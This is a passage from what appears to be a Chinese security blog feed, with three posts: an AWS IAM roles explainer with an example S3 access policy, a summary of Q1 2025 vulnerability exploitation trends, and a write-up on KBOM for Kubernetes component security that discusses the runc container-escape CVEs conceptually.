用户或组</strong>。没有钥匙，员工就无法进入餐厅的某些区域。</p><p>同样，在 AWS 中，如果没有明确允许操作的策略，就无法向 AWS 资源发出请求。在 AWS 和我们的餐厅类比中，默认状态都是在尝试访问资源时隐式拒绝。</p><p><strong>兼职员工</strong>（例如临时厨师）和客户不需要长期访问资源，但需要<strong>短期访问</strong>，类似于 <strong>IAM 角色</strong>。</p><p>兼职员工只能在很短的时间段工作，比如周末晚上。在此时间段之外，他们无权使用餐厅的资源。这个兼职厨师不一定是同一个人，可以每周都换人，不像全职员工那样有特定的身份。</p><p>因此，<strong>兼职厨师</strong>将承担厨师的角色，并获得一个<strong>临时徽章</strong>，该徽章在其<strong>轮班期间有效</strong>。这类似于<strong>一个实体承担一个附加了策略的 IAM 角色，并获得临时安全凭证，该凭证将在一段时间后过期</strong>。这里的策略是授予餐厅部分权限的一组密钥，而<strong>临时安全凭证</strong>是用于验证厨师身份的<strong>临时徽章</strong>。</p><p>同样，顾客与 IAM 角色类似，原因有二。首先，他们只需要餐厅的临时访问权限。其次，或许更重要的是，一家成功的餐厅在其整个生命周期内将拥有数万到数十万的独立顾客。</p><p>拥有大量未识别实体是 IAM 角色的理想使用场景。回想一下，AWS 对 IAM 用户数量的硬性限制是 <strong>5000</strong>。如果某个用例所需的 IAM 用户数量超过此 5000 个限制，那么使用 IAM 角色是您唯一的选择。</p><p>就像 IAM 角色的承担方式一样，客户首先需要订购某些东西来证明他们是客户并且可以承担客户的角色。<strong>承担顾客角色后，附加到该顾客角色的权限策略也将应用于顾客。</strong> 顾客仅拥有使用部分资源的权限，例如就餐区和卫生间。</p><p>为了使这个类比更贴近现实，我们假设厕所的访问是通过输入一个每天更新的密码来控制的，从而确保访问权限是暂时的。<strong>这个密码类似于附加到客户角色的、授予临时访问厕所权限的策略</strong>。</p><p><img src="/image/image_hYcmZIh9vK.png"></p><h2 id="0x05-示例场景：EC2-访问-S3"><a href="#0x05-示例场景：EC2-访问-S3" class="headerlink" title="0x05 示例场景：EC2 访问 S3"></a>0x05 示例场景：EC2 访问 S3</h2><p>如果你有一台 EC2 实例需要访问 S3 桶，那么如何授予 EC2 实例从 S3 存储桶读取和写入对象的权限？</p><p><img src="/image/image_-JViA50Gr9.png"></p><p>如上图所示，主要的步骤有：</p><ol><li>为 EC2 实例创建 IAM 角色；</li><li>将 IAM 策略附加到授予 S3 存储桶完全访问权限的角色上；</li><li>让 EC2 实例承担角色。</li></ol><p>其中，第二个步骤中的 IAM 策略是：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;s3:*&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;s3-object-lambda:*&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>现在，我们就可以对 S3 存储桶进行读写操作了。请注意，上面的策略没有指定任何 ARN，只是为资源指定来<code>*</code>，这意味着可对所有 S3 存储桶进行读写操作。但是，如果想指定单个存储桶，那么就需要提供该存储桶的 ARN。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>理解 IAM 中的用户、角色、用户组以及策略的运作机制，是你在 AWS 上设计安全解决方案的坚实基础。</p><p><img src="/image/image_84E9xYtKjN.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 年第一季度漏洞利用趋势</title>
    <link href="/2025/04/28/2025-%E5%B9%B4%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%B6%8B%E5%8A%BF/"/>
    <url>/2025/04/28/2025-%E5%B9%B4%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%B6%8B%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>已知被利用漏洞（Known Exploited Vulnerabilities，本文简称 KEV）指的是已经被证实在现实中被攻击者利用过的漏洞。也就是说，这类漏洞不仅存在理论上的风险，而是已经有实际攻击案例，在野（in the wild）被利用过。</p><p>美国 CISA（网络安全与基础设施安全局）就有一个叫 <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog（已知被利用漏洞目录）">Known Exploited Vulnerabilities Catalog（已知被利用漏洞目录）</a>的官方项目。为了造福网络安全社区和网络防御者，并帮助每个组织更好地管理漏洞并跟上威胁活动的步伐，CISA 维护着已被利用的漏洞的权威来源。组织应将 KEV 目录作为其漏洞管理优先级排序框架的输入。</p><p>原文链接：<a href="https://vulncheck.com/blog/exploitation-trends-q1-2025" title="https:&#x2F;&#x2F;vulncheck.com&#x2F;blog&#x2F;exploitation-trends-q1-2025">https://vulncheck.com/blog/exploitation-trends-q1-2025</a></p><h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>在 2025 年第一季度，VulnCheck 首次识别出 159 个 CVE 被公开披露为在野外被利用的证据。这些 KEV 的披露来自 50 个不同的来源。</p><p>我们继续观察到漏洞被迅速利用的趋势，其中 28.3% 的漏洞在 CVE 披露后的 1 天内即被利用。这一趋势延续了 2024 年观察到的节奏。</p><p>这表明防御者需要在应对新兴威胁时行动迅速，同时持续减少自己的漏洞债务。</p><h2 id="0x01-关键点"><a href="#0x01-关键点" class="headerlink" title="0x01 关键点"></a>0x01 关键点</h2><ul><li>2025 年第一季度，共有 159 个 KEV 被公开披露；</li><li>28.3% 的 KEV 在 CVE 发布后不到一天内就有被利用的证据；</li><li>25.8% 的 KEV 仍在等待或接受 NIST NVD 的分析；</li><li>3.1% 的 KEV 被 NIST NVD 分配了新的“延期（Deferred）”状态；</li><li>2 个公开报告的 KEV 拥有保留但未发布的 CVE 编号；</li><li>1 个报告的 KEV 现已被拒绝。</li></ul><h2 id="0x02-类别趋势"><a href="#0x02-类别趋势" class="headerlink" title="0x02 类别趋势"></a>0x02 类别趋势</h2><p><img src="/image/686.webp" alt="图 1：哪些产品类别、厂商和产品被报告为存在漏洞利用？"></p><p>2025 年第一季度与新 KEV 相关的前五大类别为：</p><ul><li>内容管理系统（CMS）（35 项）</li><li>网络边缘设备（29 项）</li><li>操作系统（24 项）</li><li>开源软件（14 项）</li><li>服务器软件（14 项）</li></ul><p>这些类别通常涉及面向互联网或终端用户可访问的系统。值得注意的是，与历史上桌面应用程序和浏览器常被利用的情况相比，桌面应用程序和浏览器相关的 KEV 数量相对较低。未来几个季度，这种变化是否会持续，值得关注。</p><p>主要受影响的厂商和产品包括：</p><ul><li>Microsoft Windows（15 项）</li><li>Broadcom VMware（6 项）</li><li>Cyber PowerPanel（5 项）</li><li>Litespeed Technologies（4 项）</li><li>Totolink 路由器（4 项）</li></ul><h2 id="0x03-每月趋势"><a href="#0x03-每月趋势" class="headerlink" title="0x03 每月趋势"></a>0x03 每月趋势</h2><p><img src="/image/687.png" alt="图 2：漏洞利用证据被报告的速度如何？"></p><p>当我们观察 CVE 披露到利用证据公开之间的时间时，可以更好地理解漏洞被利用的速度。我们发现，28.3% 的 KEV 在 CVE 发布后不到一天即被披露存在利用证据。还有 2 个 KEV 仍处于保留状态，1 个已被拒绝。整体上，这一速度比 2024 年稍快，说明威胁行为者在新漏洞上行动更加迅速。</p><h2 id="0x04-每周-每月趋势"><a href="#0x04-每周-每月趋势" class="headerlink" title="0x04 每周&#x2F;每月趋势"></a>0x04 每周&#x2F;每月趋势</h2><p><img src="/image/688.png" alt="图 3：每周&#x2F;每月首次报告被利用的漏洞数量是多少？"></p><p>虽然年初开始时漏洞披露速度较慢（可能是季节性原因），但在季度后半段迅速加速，最终在 2025 年第一季度累计报告了 159 个已知被利用漏洞（KEV）。平均每周披露 11.4 个，每月披露 53 个。虽然 CISA KEV 在这一季度增加了 73 个漏洞，但其中只有 12 个此前没有公开的利用证据。</p><p>对于防御者来说，这一趋势为围绕新兴漏洞威胁的能力规划提供了有价值的参考。</p><h2 id="0x05-来源分布"><a href="#0x05-来源分布" class="headerlink" title="0x05 来源分布"></a>0x05 来源分布</h2><p><img src="/image/689.png" alt="图 4：谁是最早公开报告漏洞利用的人？"></p><p>2025 年第一季度，有 159 个漏洞的利用证据来自 50 个不同组织。数据显示，这些披露呈现出长尾分布，这对于寻找可操作威胁情报的防御者来说是一个有价值的趋势。相比之下，2024 年第四季度有 190 个与 CVE 相关的漏洞利用披露，不过其中 39 个是此前已知的老旧 WordPress 漏洞，后经与 Wordfence 协调分配了 CVE 编号并正式发布，因此夸大了 Q4 的总数。如果排除这些，调整后的数字是 151。</p><p>在公开披露漏洞利用证据方面的主要贡献者包括：</p><ul><li>Shadow Server（31 项）</li><li>GreyNoise（17 项）</li><li>CISA KEV（12 项）</li><li>Microsoft（12 项）</li><li>Sentinel One（10 项）</li><li>Cyble（9 项）</li><li>Patchstack（6 项）</li><li>Secure List（5 项）</li></ul><h2 id="0x06-NVD-状态分析"><a href="#0x06-NVD-状态分析" class="headerlink" title="0x06 NVD 状态分析"></a>0x06 NVD 状态分析</h2><p><img src="/image/690.webp" alt="图 5:2025 年第一季度 KEV 的当前 NVD&#x2F;CVE 状态是怎样的？"></p><p>我们希望探讨已知被利用漏洞在 NIST NVD 中的当前状态，以识别潜在的覆盖缺口。分析发现：</p><ul><li>25.8% 的漏洞仍在等待或进行分析；</li><li>3.1% 的漏洞被赋予新的“延期（Deferred）”状态；</li><li>69.2% 的漏洞已被标记为“已分析（Analyzed）”或“已修改（Modified）”。</li></ul><h2 id="0x07-评分系统分析"><a href="#0x07-评分系统分析" class="headerlink" title="0x07 评分系统分析"></a>0x07 评分系统分析</h2><p><img src="/image/691.webp" alt="图 6：将 2025 年第一季度 KEV 映射到评分系统的情况"></p><p>在通过 CVSS 和 EPSS 评分角度审视新兴威胁用例时，我们使用了漏洞利用证据首次公开当天的 EPSS 得分，以及当时可用的任何 CVSS 得分。我们发现，即便漏洞已知被利用，当天 EPSS 得分升高的漏洞仍然只有极少数。这表明，EPSS 更像是一个滞后指标，而不是预测新兴威胁的工具。</p><p>组织在应对新兴威胁时，应谨慎依赖漏洞评分系统。</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全建设</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于 KBOM 保障 Kubernetes 组件安全</title>
    <link href="/2025/03/13/%E5%9F%BA%E4%BA%8E-KBOM-%E4%BF%9D%E9%9A%9C-Kubernetes-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    <url>/2025/03/13/%E5%9F%BA%E4%BA%8E-KBOM-%E4%BF%9D%E9%9A%9C-Kubernetes-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>本文旨在探讨供应链安全与云原生安全交叉领域的一项研究及应用——KBOM（Kubernetes Bill of Materials）。</p><p>在 Leaky Vessels 漏洞导致全球范围内容器逃逸的背景下，文章首先分析了 Kubernetes 架构的演变及其生态环境，进而揭示了 Kubernetes 组件的安全现状。</p><p>在此基础上，本文介绍了 KBOM 概念，旨在探讨业界人士为了增强 Kubernetes 组件的安全性所进行的尝试。</p><p>此外，文章进一步深入探讨了 KBOM 的核心理念和应用场景，并详细记录了为实现 KBOM 漏洞扫描器所进行的研究尝试与探索过程。</p><blockquote><p>本文是笔者参加「FCIS 2024 网络安全创新大会」的「实战攻防与供应链安全高峰论坛」中议题<a href="https://github.com/miao2sec/awesome-cloud-native-security/blob/main/%E6%BC%94%E7%A4%BA%E6%96%87%E7%A8%BF/%E5%9F%BA%E4%BA%8E%20KBOM%20%E4%BF%9D%E9%9A%9C%20Kubernetes%20%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8.pdf">《基于 KBOM 保障 Kubernetes 组件安全》</a>的文字版内容。</p></blockquote><h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><p><strong>云原生安全</strong>、<strong>供应链安全</strong>、<strong>Kubernetes 组件安全</strong>、<strong>KBOM</strong>、<strong>漏洞扫描</strong></p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在容器安全领域，runc 组件的安全漏洞屡次成为焦点。</p><p>回溯到 2019 年，CVE-2019-5736 漏洞，即“Runcescape”，由波兰研究人员 Adam Iwaniuk 和 Poplawski 发现，该漏洞使得攻击者能够获取宿主机的 root 权限，引发了安全社区的广泛关注。</p><p>如今，CVE-2024-21626 漏洞再次敲响警钟，其广泛影响激起了技术界的热议。</p><p>随着 Kubernetes 架构的持续发展，runc 等关键组件的安全问题日益凸显，引发了对 Kubernetes 组件安全现状的深刻思考。</p><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><h3 id="（一）Leaky-Vessels-漏洞"><a href="#（一）Leaky-Vessels-漏洞" class="headerlink" title="（一）Leaky Vessels 漏洞"></a>（一）Leaky Vessels 漏洞</h3><p>2023 年 11 月 20 日，Snyk 的安全研究员 Rory McNamara 发现了核心容器基础设施组件中的四个安全漏洞，统称为 Leaky Vessels 漏洞，如表 1 所示。</p><p>表 1：Leaky Vessels 的漏洞概览</p><table><thead><tr><th><strong>漏洞编号</strong></th><th><strong>影响范围</strong></th><th><strong>漏洞标题</strong></th><th><strong>威胁等级</strong></th><th><strong>CVSS 分数</strong></th></tr></thead><tbody><tr><td>CVE-2024-23651</td><td>Docker Buildkit≤v0.12.4</td><td>构建镜像时因条件竞争导致容器逃逸</td><td>高危</td><td>7.8</td></tr><tr><td>CVE-2024-23652</td><td>Docker Buildkit≤v0.12.4</td><td>构建镜像时清理阶段可能导致任意文件删除</td><td>超危</td><td>9.1</td></tr><tr><td>CVE-2024-23653</td><td>Docker Buildkit≤v0.12.4</td><td>构建镜像时缺少 GRPC 安全模式的权限检查导致容器逃逸</td><td>超危</td><td>9.8</td></tr><tr><td>CVE-2024-21626</td><td>v1.0.0-rc93≤runc&lt;&#x3D;1.1.11</td><td>因文件描述符泄漏导致容器逃逸</td><td>高危</td><td>8.6</td></tr></tbody></table><p>在对漏洞进行验证后，<a href="https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/">Snyk 迅速启动了负责任的漏洞披露流程</a>。整个流程经历了 72 天，期间 Snyk 还发布了动态和静态的检测工具，以供组织进行检测。</p><p>直至 2024 年 2 月 1 日，国内安全厂商才发布漏洞预警，各行业公司随即展开了应急响应。</p><p>表 2：Leaky Vessels 的漏洞披露流程</p><table><thead><tr><th><strong>时间节点</strong></th><th><strong>事项</strong></th></tr></thead><tbody><tr><td>2023 年 11 月 20 日这一周</td><td>漏洞首次被发现，Rory McNamara 完成了漏洞验证并构建了 PoC</td></tr><tr><td>2023 年 12 月 11 日</td><td>将漏洞详情报告给 Docker，Docker 当日确认了漏洞</td></tr><tr><td>2023 年 12 月 12 日</td><td>Snyk 收到 Docker 请求，将 WORKDIR 漏洞转交 runc，认为该漏洞属于 runc</td></tr><tr><td>2023 年 12 月 13 日</td><td>Rory 被添加为 Docker&#x2F;Buildkit 任意删除和 grpc 漏洞的 Github 安全公告合作者</td></tr><tr><td>2023 年 12 月 19 日</td><td>Rory 被添加为 runc 的 WORKDIR 漏洞的 Github 安全公告合作者</td></tr><tr><td>2023 年 12 月 20 日</td><td>Rory 被添加为 Docker &#x2F; Buildkit 缓存竞争漏洞的 Github 安全公告合作者</td></tr><tr><td>2024 年 1 月 2 日</td><td>runc 被分配 CVE 编号</td></tr><tr><td>2024 年 1 月 17 日</td><td>runc 通过安全邮件列表发布修复补丁公告，并要求在 2024 年 1 月 31 日前应用补丁</td></tr><tr><td>2024 年 1 月 24 日</td><td>Docker 被 Github 分配 CVE 编号</td></tr><tr><td>2024 年 1 月 31 日</td><td>Leaky Vessel 的四个漏洞公开，Snyk 开源了动态检测工具 <a href="https://www.github.com/snyk/leaky-vessels-dynamic-detector">leaky-vessels-dynamic-detector</a> 和静态检测工具  <a href="https://github.com/snyk/leaky-vessels-static-detector">leaky-vessels-static-detector</a>。</td></tr></tbody></table><h3 id="（二）CVE-2024-21626-漏洞"><a href="#（二）CVE-2024-21626-漏洞" class="headerlink" title="（二）CVE-2024-21626 漏洞"></a>（二）CVE-2024-21626 漏洞</h3><p>Leaky Vessels 漏洞中，CVE-2024-21626 的影响范围最为广泛。</p><p>在 runc 1.11 及更早的版本中，由于内部文件描述符泄漏的问题，攻击者可以让新生成的容器进程在宿主文件系统命名空间中拥有工作目录，从而允许通过访问宿主文件系统实现容器逃逸。</p><p>此外，恶意镜像也可以使用相同的攻击，令容器进程通过 runc run 访问主机文件系统。</p><p>表 3：受 CVE-2024-21626 影响的常见的组件</p><table><thead><tr><th><strong>影响组件</strong></th><th><strong>影响版本</strong></th><th><strong>已修复版本</strong></th></tr></thead><tbody><tr><td>runc</td><td>≥v1.0.0-rc93，≤v1.1.11</td><td>v1.1.12</td></tr><tr><td>conatinerd</td><td>≥1.4.7，≤1.6.27 ≥1.7.0，≤1.7.12</td><td>v1.6.28 v1.7.13</td></tr><tr><td>BuildKit</td><td>≤0.12.4</td><td>v0.12.5</td></tr><tr><td>Moby (Docker Engine)</td><td>≤v25.0.1 ≤v24.0.8</td><td>v25.0.2 v24.0.9</td></tr><tr><td>Docker Desktop</td><td>≤4.27.0</td><td>4.27.1</td></tr><tr><td>containerd</td><td>≤1.6.27 ≤1.7.12</td><td>1.6.28 1.7.13</td></tr></tbody></table><p>这些攻击的不同形式都可以用来覆盖宿主机上的一些特定程序文件，以实现从容器内部完全逃逸到宿主机。</p><p>据 Dark Reading 报道，<a href="https://www.darkreading.com/cloud-security/leaky-vessel-cloud-bugs-container-escapes-globally">Leaky Vessels 漏洞事件触发了全球范围内的容器逃逸现象</a>；Wiz 推测，<a href="https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities">至少有 80% 的云环境可能会受到该漏洞的影响</a>；而阿里云基于其庞大的数据资源，<a href="https://avd.aliyun.com/detail?id=CVE-2024-21626">评估出全网至少有 100,000 个应用可能遭受该漏洞的影响</a>。</p><p>鉴于 runc 是一个底层的容器运行时，能够基于 Linux 内核创建并运行容器，成为了几乎所有的容器引擎调用的第三方库，因此该漏洞的影响范围扩展至包括 Containerd、Docker Engine 等众多基于 runc 特定版本构建的下游组件及软件。</p><p><img src="/image/674.webp" alt="图 1：runc 组件的上下游关系"></p><h3 id="（三）总结"><a href="#（三）总结" class="headerlink" title="（三）总结"></a>（三）总结</h3><p>值得注意的是，runc 并非首次被披露出影响范围如此广泛的漏洞了。</p><p>2019 年 2 月 11 日，波兰研究人员 Adam Iwaniuk 和 Poplawski 在研究 namespace 沙盒时，无意间在 runc 中发现了 CVE-2019-5736 漏洞，并命名为 <a href="https://thenewstack.io/what-you-need-to-know-about-the-runc-container-escape-vulnerability/">Runcescape</a>，该漏洞同样允许攻击者获取宿主机的 root 访问权限。</p><p>与 CVE-2019-5736 漏洞类似，CVE-2024-21626 漏洞同样引起了广泛的关注，众多技术博客和商业公司均对该漏洞进行了专题讨论。</p><p>不同的是，随着 Kubernetes 架构的不断演进，runc 等组件的安全漏洞事件引发了我们对 Kubernetes 组件安全现状的担忧。</p><h2 id="二、Kubernetes-组件安全现状"><a href="#二、Kubernetes-组件安全现状" class="headerlink" title="二、Kubernetes 组件安全现状"></a>二、Kubernetes 组件安全现状</h2><h3 id="（一）Kubernetes-架构及生态"><a href="#（一）Kubernetes-架构及生态" class="headerlink" title="（一）Kubernetes 架构及生态"></a>（一）Kubernetes 架构及生态</h3><p>容器的生态系统由新兴技术、众多专业术语以及相互竞争的大型企业组成。</p><p>这些企业偶尔会暂停竞争，共同建立如 CRI、CNI 以及 CSI 等标准，以促进整个生态系统的互操作性，从而允许组织在不同的平台和操作系统上运行容器，减少对单一项目的依赖。</p><p>Kubernetes 于 2022 年 5 月 4 日发布了 <a href="https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.24.md#dockershim-removed-from-kubelet">v1.24.0 版本</a>，在该版本中已彻底移除了 dockershim 插件，这标志着 Kubernetes 已正式结束对 Docker 容器运行时的原生支持了。</p><p><img src="/image/675.webp" alt="图 2：Kubernetes v1.24.0 已完全移除了 dockershim"></p><p>随着时间的推移，Kubernetes 允许接入多种运行时组件、网络组件和存储组件，逐步演变成一个与容器无关的编排平台了。</p><p>伴随着架构的变化，Kubernetes 的第三方生态系统也得到了蓬勃的发展。组织可根据 CNCF 发布的<a href="https://landscape.cncf.io/">云原生蓝图</a>，按需选择适合的组件、插件和工具。</p><p><img src="/image/676.webp" alt="图 3：云原生蓝图"></p><p>然而，丰富的选择也带来了相应的风险。我们对云原生蓝图中所提及的部分组件的安全公告进行了初步的<a href="https://github.com/miao2sec/cloud-native-sec-vuln">采集</a>，发现近年来云原生组件的漏洞数量呈现出上升的趋势，且越为通用的组件，其漏洞数量增长越迅速。</p><h3 id="（二）Kubernetes-威胁建模"><a href="#（二）Kubernetes-威胁建模" class="headerlink" title="（二）Kubernetes 威胁建模"></a>（二）Kubernetes 威胁建模</h3><p>在 Kubernetes 的威胁建模中，组件安全占据着核心地位。</p><ul><li><p>在 CNCF 提出的<a href="https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/securing-the-4-cs-of-cloud-native-systems-cloud-cluster-container-and-code">云原生安全 4C 模型</a>中，集群组件安全被称为集群（Cluster）安全的三大要素之一；</p></li><li><p>在微软构建的 <a href="https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/">Kubernetes ATT&amp;CK 威胁矩阵</a>中，容器逃逸技术的主要影响因素为运行时组件本身的漏洞；</p></li><li><p>OWASP 在发布 <a href="https://owasp.org/www-project-kubernetes-top-ten/">Kubernetes Top 10</a> 时，将“过时且易受攻击的 Kubernetes 组件”列为十大安全风险之一；</p></li><li><p>CNCF 金融服务用户组在采用 <a href="https://github.com/cncf/financial-user-group/tree/main/projects/k8s-threat-model">STRIDE 方法</a>对 Kubernetes 进行威胁建模时，先对 Kubernetes 组件进行审查，再识别平台内信任边界处的潜在安全问题。</p></li></ul><p><img src="/image/677.webp" alt="图 4：Kubernetes 威胁建模"></p><h3 id="（三）总结-1"><a href="#（三）总结-1" class="headerlink" title="（三）总结"></a>（三）总结</h3><p>随着 Kubernetes 架构的演变以及生态系统的蓬勃发展，集群组件的安全受到了业界的广泛关注。</p><p>然而，与单个容器安全防护的应用实践相比，容器编排整体安全防护仍然缺乏有效的落地方案。</p><p>此外，针对 Kubernetes 的安全防护措施，也主要依赖于配置扫描以及容器镜像漏洞检测。</p><p><strong>此后，业界对于 Kubernetes 组件安全的关注相对较少，且呈现出一定程度的滞后。</strong></p><h2 id="三、Kubernetes-物料清单（KBOM）"><a href="#三、Kubernetes-物料清单（KBOM）" class="headerlink" title="三、Kubernetes 物料清单（KBOM）"></a>三、Kubernetes 物料清单（KBOM）</h2><h3 id="（一）首个-KBOM-标准颁布"><a href="#（一）首个-KBOM-标准颁布" class="headerlink" title="（一）首个 KBOM 标准颁布"></a>（一）首个 KBOM 标准颁布</h3><p>为了有效应对 Kubernetes 组件所面临的安全风险，Kubernetes 安全运营中心（Kubernetes Security Operations Center，简称 KSOC）于 2023 年 5 月 8 日发布了首个 Kubernetes 物料清单（Kubernetes Bill of Materials，简称 KBOM）标准，并开源了可为集群自动生成物料清单的名为 <a href="https://github.com/rad-security/kbom">KBOM</a> 的工具。</p><p><img src="/image/678.webp" alt="图 5：首个 KBOM 生成工具"></p><p>KBOM 作为一种新确立的标准，每当被提及时，往往会与 Kubernetes 的软件物料清单（Software Bill of Materials，简称 SBOM）一同讨论，以进行区分并避免混淆。</p><p>Kubernetes 的 SBOM 侧重于单个容器的安全性，主要通过遍历容器镜像的文件系统，解析其中的软件包信息，以识别出系统层与软件层的软件包及其依赖关系。</p><p>SBOM 在法规性文件中已较为成熟，最早在 2014 年美国国会众议院的<a href="https://www.congress.gov/bill/113th-congress/house-bill/5793">《网络供应链管理与透明度法案》</a>中被提及。</p><p>相较之下，KBOM 的聚焦于 Kubernetes 平台本身的安全。主要通过向 API Server 发送 HTTP(S) 请求，解析所响应的 JSON 数据，以对集群资源及其运行的组件（如 API Server、Etcd 和 Containerd 等）进行收集。</p><p>KBOM 作为云原生安全与供应链安全交叉领域的一项新兴技术，在 2023 年<a href="https://rad.security/blog/ksoc-releases-the-first-kubernetes-bill-of-materials-kbom-standard">首次被提出</a>。</p><h3 id="（二）KBOM-的生成"><a href="#（二）KBOM-的生成" class="headerlink" title="（二）KBOM 的生成"></a>（二）KBOM 的生成</h3><p>为了方便开发与测试，在生成集群的 KBOM 的过程中，我们建议采用 <a href="https://github.com/kubernetes-sigs/kind">kind</a> 工具在本地创建并启动一个集群。</p><p><img src="/image/679.webp" alt="图 6：在本地创建并启动测试集群"></p><p>随后根据系统提示，对集群信息进行收集。若要深入理解 API Server 的交互细节，可将日志级别调整至 7 级，以便详细监控和记录 HTTP(S) 数据包的通信过程。</p><p><img src="/image/680.webp" alt="图 7：查看 API Server 交互过程中的数据包"></p><p>然后，使用 Kubernetes 提供的客户端库来管理和操作集群资源，以提高集群信息获取的自动化程度。例如，Go 语言的 k8s.io&#x2F;client-go 库便封装了一系列与 Kubernetes API Server 交互的接口，可帮助我们自动收集元数据、节点信息、组件信息以及镜像信息。</p><p>在成功获取到这些信息后，只需进一步将其转换成 KSOC 所定义的 <a href="https://github.com/rad-security/kbom/blob/main/internal/kube/kube.go">KBOM 标准格式</a>，即可对集群进行安全审计和管理。</p><p><img src="/image/681.webp" alt="图 8：自动获取集群信息的主要代码"></p><h3 id="（三）KBOM-的数据结构"><a href="#（三）KBOM-的数据结构" class="headerlink" title="（三）KBOM 的数据结构"></a>（三）KBOM 的数据结构</h3><p>KBOM 包含了集群信息、节点信息以及组件信息等数据，有助于组织对集群的整体安全进行评估。</p><p>以本文第一部分所提及的 <a href="https://bestwing.me/CVE-2024-21626-container-escape.html">CVE-2024-21626</a> 漏洞为例，该漏洞导致容器逃逸的主要原因在于 runc 在使用 openat2 系统调用时未能正确关闭文件描述符。值得注意的是，Linux 内核在 5.6 版本之前并未实现 openat2 系统调用。因此，若容器引擎运行在 5.6 版本之前的 Linux 内核上，那么它将不会受到该漏洞影响。</p><p>为了帮助组织快速评估其集群是否受此漏洞影响，KBOM 提供了内核版本和容器运行时版本等关键信息。此外，KBOM 还提供了 Kubernetes 版本、kubelet 版本、kube-proxy 版本以及各组件镜像等信息，以便于组织对集群组件安全进行快速评估。</p><p><img src="/image/682.webp" alt="图 9：KBOM 的数据实例和数据结构"></p><p>如表 4 所示，在对 KBOM 所包含的信息进行分析后，我们观察到：</p><ul><li><p>相对于<a href="https://about.gitlab.com/blog/2022/09/22/introducing-the-infrastructure-bill-of-materials/">基础设施物料清单（Infrastructure Bill of Material，简称 IBOM）</a>，KBOM 补全了 IBOM 在 Kubernetes 特定内容方面的缺失。例如：集群中运行的容器镜像以及与之交互的第三方生态系统信息。</p></li><li><p>Kubernetes 的 SBOM 则仅限于镜像的物料清单，它并未包含控制平面或自定义资源中使用的第三方镜像信息。相比之下，KBOM 关注于 Kubernetes，能够全面涵盖集群中的各个组件，包括控制平面和自定义资源。在对集群的组件进行安全评估时，能够迅速地识别出相关的 CVE 漏洞。</p></li></ul><p>表 4:0.3.1 版本的 KBOM 所包含的最新信息（截止至 2024 年 12 月 30 日）</p><table><thead><tr><th><strong>类型</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>总容量（Capacity）</td><td>CPU、内存、Pods 以及临时存储等资源信息</td></tr><tr><td>集群信息（Cluster）</td><td>集群名称、CA 证书摘要、Kubernetes 版本、CNI 版本、地理位置、节点数、节点信息以及组件信息等</td></tr><tr><td>组件信息（Components）</td><td>镜像信息和资源信息等</td></tr><tr><td>镜像信息（Image）</td><td>镜像的完整名称、名称、版本和 digest 等信息</td></tr><tr><td>工具信息（Tool）</td><td>工具供应商、名称、构建时间、版本、提交 ID 以及提交时间等信息</td></tr><tr><td>资源信息（Resource）</td><td>资源种类、API 版本、名称、命名空间以及附加属性等信息</td></tr><tr><td>资源列表（Resource List）</td><td>资源的种类、API 